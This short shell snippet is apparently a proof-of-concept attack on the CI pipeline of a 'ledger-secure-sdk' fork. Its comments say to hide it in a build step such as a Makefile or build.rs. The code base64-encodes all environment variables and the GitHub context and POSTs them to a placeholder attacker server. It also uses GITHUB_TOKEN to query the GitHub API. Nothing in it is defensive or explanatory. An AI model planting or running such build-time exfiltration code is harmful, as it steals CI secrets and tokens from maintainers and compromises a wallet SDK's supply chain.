# In your ledger-secure-sdk fork, create or modify a file that gets executed during build
# For example, add to a Makefile or build.rs

#!/bin/bash
# Add this to a script that runs during build

# Exfiltrate environment variables and secrets
curl -X POST -H "Content-Type: application/json" \
  -d "{
    \"secrets\": \"$(env | base64 -w 0)\",
    \"github_context\": \"$(cat $GITHUB_CONTEXT 2>/dev/null | base64 -w 0)\"
  }" \
  https://your-attacker-server.com/collect

# Or try to access GitHub token
if [ -n "$GITHUB_TOKEN" ]; then
  curl -H "Authorization: token $GITHUB_TOKEN" \
    https://api.github.com/user > /tmp/exfiltrated_user.json
fi
